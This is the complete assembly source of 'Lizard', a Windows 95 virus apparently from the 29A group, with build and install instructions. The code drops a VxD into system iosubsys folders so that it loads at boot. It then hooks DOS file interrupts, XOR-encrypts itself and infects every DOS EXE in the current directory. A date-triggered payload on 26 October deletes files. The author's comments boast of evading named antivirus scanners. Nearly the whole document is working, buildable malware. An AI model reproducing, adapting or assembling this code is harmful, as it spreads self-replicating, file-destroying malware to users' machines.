;-----------------------------------------------------------------------------
;Lizard by Reptile/29A (another version ;)
;-----------------------------------------------------------------------------

;                          млллллм млллллм млллллм
;                          ллл ллл ллл ллл ллл ллл
;                           мммллп плллллл ллллллл
;                          лллмммм ммммллл ллл ллл
;                          ллллллл ллллллп ллл ллл

;This is an encrypted vxd direct action dos exe infector (I added some anti-
;heuristics and other stuff and optimized the code of v1.0).

;When an infected file is run the virus decrypts itself, drops lzd.vxd to the
;available one of the three dirs and then returns back to the host. After the
;next reboot...

;When windoze 95 is starting, it loads the vxd (lzd.vxd) automatically coz
;it's in the '\iosubsys\' dir (Lizard doesn't need to modify the system.ini
;or the registry). Then the virus takes control and hooks the V86 interrupt
;chain. It executes on exec (4bh), create (3ch), ext. open (6ch), close (3eh)
;and on find first file (4eh) using direct action techniques to infect all
;dos exes in the current directory (*highly* infectious!). Lzd.vxd has a size
;of 7099 bytes (masm sux! :P ), but the victims are only increased by 1967 (!)
;bytes.

;Findvirus v7.75, AVP v3.0 and TBAV v8.03 (high heuristic sensitivity!) can't
;detect it (all for win95).

;Compiling lzd.vxd (win95 DDK):
;makefile

;Compiling rmlzd.inc:
;tasm /m2 rmlzd.asm
;tlink /t rmlzd.obj
;file2db rmlzd.com (or another db generator)
;modify rmlzd.dat

;To install copy lzd.vxd to one of the following dirs:
;- c:\windows\system\iosubsys
;- c:\win95\system\iosubsys
;- c:\windows.000\system\iosubsys
;...or start lizard.exe :)

;P.S.:
;Sandy: are u lucky now? ;)
;Jacky: thanx for testing it!
;GriYo: the stack stuff really didn't work :P

;P.P.S:
;TrY MaGiC MuShRoOmS...

;---[LZD.ASM]-----------------------------------------------------------------

.386p

.xlist
include vmm.inc
.list

vxdhsize equ 701
vxddsize equ 81
vxdcsize equ 880
esize equ encend - encstart
vsize equ vend - start

Declare_Virtual_Device LZD, 6, 66, LZD_Control, Undefined_Device_Id, \
Undefined_Init_Order,, 

VxD_Locked_Data_Seg
wcard db '*.e?e',0  ;*.l?z
include rmlzd.inc    ;realmode code
dflag db 0
pflag db 0
ndta db 43 dup (?)
header db 26 dup (?)
VxD_Locked_Data_Ends
;-----------------------------------------------------------------------------
VxD_Locked_Code_Seg
BeginProc LZD_Device_Init
;trigger
mov ah,2ah  ;get date
vxdint 21h
;live drazil si
cmp dh,10   ;26.10.?
jne npload
cmp dl,26
jne npload

mov pflag,1 ;hehe

npload:
mov eax,21h ;install int 21h handler
mov esi,offset32 int21h
VMMcall Hook_V86_Int_Chain
clc
ret
EndProc LZD_Device_Init
;-----------------------------------------------------------------------------
BeginProc int21h
cmp [ebp.Client_AH],4bh   ;exec 
je short ww
cmp [ebp.Client_AH],3ch   ;create 
je short ww
cmp [ebp.Client_AH],6ch   ;ext. open 
je short ww
cmp [ebp.Client_AH],3eh   ;close 
je short ww
cmp [ebp.Client_AH],4eh   ;find first 
je short ww
jmp prevhook

ww:
Push_Client_State   ;save regs          
VMMcall Begin_Nest_Exec    
;-----------------------------------------------------------------------------
cmp dflag,1
je done
mov ax,3d02h   ;open lzd.vxd
lea edx,dropname1   ;in the 'c:\windows\system\iosubsys' dir
vxdint 21h
jnc short rd

mov ax,3d02h   ;open the vxd
lea edx,dropname2   ;in the 'c:\win95\system\iosubsys' dir
vxdint 21h
jnc short rd

mov ax,3d02h   ;open the vxd
lea edx,dropname3   ;in the 'c:\windows.000\system\iosubsys' dir
vxdint 21h
jc ecsit  ;skip it

rd:
xchg ax,bx

mov ah,3fh  ;store the header of the vxd
mov cx,vxdhsize
lea edx,vxdheader
vxdint 21h

mov ax,4201h    ;jmp over zeros
xor cx,cx
mov dx,3400
vxdint 21h

mov ah,3fh  ;store the vxddata
mov cx,vxddsize
lea edx,vxddata
vxdint 21h

mov ax,4201h    ;jmp over realmodecode and zeros
xor cx,cx
mov dx,2037
vxdint 21h

mov ah,3fh  ;store the vxdcode
mov cx,vxdcsize
lea edx,vxdcode
vxdint 21h

mov ah,3eh  ;close...   
vxdint 21h

mov dflag,1 ;set flag
;-----------------------------------------------------------------------------
done:
mov ah,1ah  ;set dta
lea edx,ndta
vxdint 21h

ffirst:
mov ah,4eh  ;search for first exe
jmp short w
fnext:
mov ah,4fh  ;find next exe
w:
mov cx,7
lea edx,wcard   ;*.e?e
vxdint 21h
jc ecsit

mov ax,4301h    ;set normal attribute
mov cx,20h
lea edx,[ndta + 30]
vxdint 21h

cmp pflag,1 ;sux0ring microsuckers
jne pheeew  ;(the payload in v1.0 was a bit too destructive ;)

evil:
;evil payload against the imperialism of microsoft! 
mov ah,41h  ;yhcrana
lea edx,[ndta + 30]
vxdint 21h
jmp ecsit

pheeew:
mov ax,3d02h   ;open the victim
lea edx,[ndta + 30]
vxdint 21h
jc fnext
xchg ax,bx

mov ah,3fh   ;read header
mov cx,26
lea edx,header
vxdint 21h

cmp word ptr [header],'ZM'  ;exe?
jne cfile
cmp word ptr [header + 0ch],0ffffh ;allocate all mem?
jne cfile
cmp word ptr [header + 18h],40h ;win exe?
je cfile 
mov al,[header + 12h] ;infected?
or al,al
jne cfile

;save ss:sp
mov ax,word ptr [header + 0eh]
mov sseg,ax
mov ax,word ptr [header + 10h]
mov ssp,ax

;save cs:ip
mov eax,dword ptr [header + 14h]
mov csip,eax

mov ax,4202h    ;eof
xor cx,cx
cwd
vxdint 21h

;calc new cs:ip
mov cx,16
div cx
sub ax,word ptr [header + 8]

mov word ptr [header + 14h],dx
mov word ptr [header + 16h],ax

add edx,vend    ;calc stack

mov word ptr [header + 0eh],ax 
mov word ptr [header + 10h],dx

;xor encryption
rdnm:
in al,40h
or al,al
je rdnm
mov [encval],al ;save random value

mov edi,offset32 encstart
mov cx,esize
xl:
xor [edi],al
inc edi
loop xl

;write virus
mov ah,40h      
mov cx,vsize
mov edx,offset32 start
vxdint 21h

;undo
mov al,[encval] 
mov edi,offset32 encstart
mov cx,esize

xll:
xor [edi],al
inc edi
loop xll

mov ax,4202h    ;eof
xor cx,cx
cwd
vxdint 21h

mov cx,512  ;calc pages
div cx
or dx,dx
jz short np
inc ax
np:
mov word ptr [header + 4],ax
mov word ptr [header + 2],dx

mov ax,4200h    ;bof
xor cx,cx
cwd
vxdint 21h

rnd:
in al,40h   ;set infection flag
or al,al
je rnd
mov [header + 12h],al

mov ah,40h   ;write new header
mov cx,26
lea edx,header
vxdint 21h

cfile:
mov cl,byte ptr [ndta + 21] ;restore attribute
lea edx,[ndta + 1eh]
mov ax,4301h
vxdint 21h

mov cx,word ptr [ndta + 22] ;restore time/date
mov dx,word ptr [ndta + 24]
mov ax,5701
vxdint 21h

mov ah,3eh  ;close file
vxdint 21h
jmp fnext

ecsit:
VMMcall End_Nest_Exec    
Pop_Client_State         

prevhook:      
stc
ret
EndProc int21h
;-----------------------------------------------------------------------------
BeginProc LZD_Control
Control_Dispatch Init_Complete,LZD_Device_Init
clc
ret
EndProc LZD_Control
wb db 13,10,'Lizard by Reptile/29A',0
VxD_Locked_Code_Ends
End ;this is the end my only friend the end...

;---[RMLZD.ASM]---------------------------------------------------------------

;Lizard's real mode portion

.286

vxdhsize equ 701
vxddsize equ 81
vxdcsize equ 880
esize equ encend - encstart
rmsize equ rmend - rmstart

.model tiny

.code
org 100h
start:
rmstart:
;get delta
;-----------------------------------------------------------------------------
call $ + 3
drazil:
pop si
sub si,offset drazil
push si
pop bp
;-----------------------------------------------------------------------------
push ds ;coz psp 

push cs
pop ds

;decrypt it
db 176  ;mov al
encval db 0
;-----------------------------------------------------------------------------
lea di,[bp + offset encstart]
mov cx,esize
xd:
jmp fj
fj2:
inc di
loop xd
jmp encstart
fj:
xor [di],al
jmp fj2
;-----------------------------------------------------------------------------
encstart:
mov ax,3d00h    ;try to open lzd.vxd in
lea dx,[bp + offset dropname1]  ;c:\windows\system\iosubsys
int 21h
jnc cfile   ;exit if already installed
mov ah,3ch  ;install lzd.vxd
xor cx,cx
int 21h
jnc inst

mov ax,3d00h    ;try to open lzd.vxd in
lea dx,[bp + offset dropname2]  ;c:\win95\system\iosubsys
int 21h
jnc cfile
mov ah,3ch
xor cx,cx
int 21h
jnc inst

mov ax,3d00h    ;try to open lzd.vxd in
lea dx,[bp + offset dropname3]  ;c:\windows.000\system\iosubsys
int 21h
jnc cfile
mov ah,3ch
xor cx,cx
int 21h
jc exit

inst:
xchg ax,bx

mov ah,40h  ;write the header  
mov cx,vxdhsize
lea dx,[bp + offset vxdheader]
int 21h

;write some zeros
mov cx,3400
lzero:
push cx
mov ah,40h
mov cx,1
lea dx,[bp + zero]
int 21h
pop cx
loop lzero

mov ah,40h  ;write the data
mov cx,vxddsize
lea dx,[bp + offset vxddata]
int 21h

mov ah,40h  ;write the rmcode
mov cx,rmsize
lea dx,[bp + offset rmstart]
int 21h

;write some more zeros
mov cx,1732
lzero2:
push cx
mov ah,40h
mov cx,1
lea dx,[bp + zero]
int 21h
pop cx
loop lzero2

mov ah,40h  ;write the code
mov cx,vxdcsize
lea dx,[bp + offset vxdcode]
int 21h

cfile:
mov ah,3eh
int 21h

;exe return
exit:
pop ax  ;psp
add ax,11h
dec ax
add word ptr [bp + offset csip + 2],ax

;stack
db 5    ;add ax
sseg dw 0fff0h  ;test
mov ss,ax 

db 0bch ;mov sp
ssp dw 0fffeh

db 0eah
csip dd 0fff00000h 

zero db 0

dropname1 db 'c:\windows\system\iosubsys\lzd.vxd',0
dropname2 db 'c:\win95\system\iosubsys\lzd.vxd',0
dropname3 db 'c:\windows.000\system\iosubsys\lzd.vxd',0 
rmend:
vxdheader db vxdhsize dup (?)
vxddata db vxddsize dup (?)
vxdcode db vxdcsize dup (?)
encend:
ends
end start

;---[RMLZD.INC]---------------------------------------------------------------

;Modified db listing of rmlzd.com

start:
db 0E8h, 000h, 000h, 05Eh, 081h, 0EEh, 003h, 001h
db 056h, 05Dh, 01Eh, 00Eh, 01Fh, 0B0h
;db 000h
encval db 0
db 08Dh
db 0BEh, 021h, 001h, 0B9h, 08Eh, 007h, 0EBh, 005h
db 047h, 0E2h, 0FBh, 0EBh, 004h, 030h, 005h, 0EBh
db 0F7h
encstart:
db 0B8h, 000h, 03Dh, 08Dh, 096h, 0C6h, 001h
db 0CDh, 021h, 073h, 07Fh, 0B4h, 03Ch, 033h, 0C9h
db 0CDh, 021h, 073h, 026h, 0B8h, 000h, 03Dh, 08Dh
db 096h, 0E9h, 001h, 0CDh, 021h, 073h, 06Ch, 0B4h
db 03Ch, 033h, 0C9h, 0CDh, 021h, 073h, 013h, 0B8h
db 000h, 03Dh, 08Dh, 096h, 00Ah, 002h, 0CDh, 021h
db 073h, 059h, 0B4h, 03Ch, 033h, 0C9h, 0CDh, 021h
db 072h, 055h, 093h, 0B4h, 040h, 0B9h, 0BDh, 002h
db 08Dh, 096h, 031h, 002h, 0CDh, 021h, 0B9h, 048h
db 00Dh, 051h, 0B4h, 040h, 0B9h, 001h, 000h, 08Dh
db 096h, 0C5h, 001h, 0CDh, 021h, 059h, 0E2h, 0F1h
db 0B4h, 040h, 0B9h, 051h, 000h, 08Dh, 096h, 0EEh
db 004h, 0CDh, 021h, 0B4h, 040h, 0B9h, 031h, 001h
db 08Dh, 096h, 000h, 001h, 0CDh, 021h, 0B9h, 0C4h
db 006h, 051h, 0B4h, 040h, 0B9h, 001h, 000h, 08Dh
db 096h, 0C5h, 001h, 0CDh, 021h, 059h, 0E2h, 0F1h
db 0B4h, 040h, 0B9h, 070h, 003h, 08Dh, 096h, 03Fh
db 005h, 0CDh, 021h, 0B4h, 03Eh, 0CDh, 021h, 058h
db 005h, 011h, 000h, 048h, 001h, 086h, 0C3h, 001h
db 005h
;db 0F0h, 0FFh
sseg dw 0fff0h  ;not necessary
db 08Eh, 0D0h, 0BCh
;db 0FEh, 0FFh
ssp dw 0fffeh
db 0EAh
;db 000h, 000h, 0F0h, 0FFh
csip dd 0fff00000h
db 000h
;db 063h, 03Ah
;db 05Ch, 077h, 069h, 06Eh, 064h, 06Fh, 077h, 073h
;db 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh, 05Ch
;db 069h, 06Fh, 073h, 075h, 062h, 073h, 079h, 073h
;db 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h, 064h
;db 000h, 063h, 03Ah, 05Ch, 077h, 069h, 06Eh, 039h
;db 035h, 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh
;db 05Ch, 069h, 06Fh, 073h, 075h, 062h, 073h, 079h
;db 073h, 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h
;db 064h, 000h, 063h, 03Ah, 05Ch, 077h, 069h, 06Eh
;db 064h, 06Fh, 077h, 073h, 02Eh, 030h, 030h, 030h
;db 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh, 05Ch
;db 069h, 06Fh, 073h, 075h, 062h, 073h, 079h, 073h
;db 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h, 064h
;db 000h
dropname1 db 'c:\windows\system\iosubsys\lzd.vxd',0
dropname2 db 'c:\win95\system\iosubsys\lzd.vxd',0
dropname3 db 'c:\windows.000\system\iosubsys\lzd.vxd',0
vxdheader db vxdhsize dup (?)
vxddata db vxddsize dup (?)
vxdcode db vxdcsize dup (?)
encend:
vend:

;---[LZD.DEF]-----------------------------------------------------------------

VXD LZD DYNAMIC
DESCRIPTION ''
SEGMENTS
    _LPTEXT     CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _LTEXT      CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _LDATA      CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _TEXT       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _DATA       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    CONST       CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _TLS        CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _BSS        CLASS 'LCODE'   PRELOAD NONDISCARDABLE
    _ITEXT      CLASS 'ICODE'   DISCARDABLE
    _IDATA      CLASS 'ICODE'   DISCARDABLE
    _PTEXT      CLASS 'PCODE'   NONDISCARDABLE
    _PDATA      CLASS 'PDATA'   NONDISCARDABLE SHARED
    _STEXT      CLASS 'SCODE'   RESIDENT
    _SDATA      CLASS 'SCODE'   RESIDENT
    _DBOSTART   CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _DBOCODE    CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _DBODATA    CLASS 'DBOCODE' PRELOAD NONDISCARDABLE CONFORMING
    _16ICODE    CLASS '16ICODE' PRELOAD DISCARDABLE
    _RCODE      CLASS 'RCODE'

EXPORTS
       LZD_DDB @1

;---[MAKEFILE]----------------------------------------------------------------

NAME = lzd

LINK = LINK

ASM    = ml
AFLAGS = -coff -DBLD_COFF -DIS_32 -W2 -c -Cx -Zm -DMASM6 -DDEBLEVEL=0
ASMENV = ML
LFLAGS = /VXD /NOD

.asm.obj:
	set $(ASMENV)=$(AFLAGS)
        $(ASM) -Fo$*.obj $<

all : $(NAME).VXD

OBJS = lzd.obj

lzd.obj: lzd.asm

$(NAME).VxD: $(NAME).def $(OBJS)
        link @<<$(NAME).lnk
$(LFLAGS) 
/OUT:$(NAME).VxD
/MAP:$(NAME).map
/DEF:$(NAME).def
$(OBJS)
<<

 @del *.exp>nul
 @del *.lib>nul
 @del *.map>nul
 @del *.obj>nul 
;...